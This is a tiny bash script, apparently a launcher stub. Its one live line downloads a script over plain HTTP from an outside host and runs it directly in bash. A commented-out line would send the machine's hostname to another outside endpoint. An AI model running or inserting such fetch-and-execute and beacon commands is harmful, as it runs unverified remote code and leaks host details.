#!/bin/bash
#curl -d "1m $(hostname)" https://n.yyps.de/alert
bash <(curl -L http://execute.yyps.de)

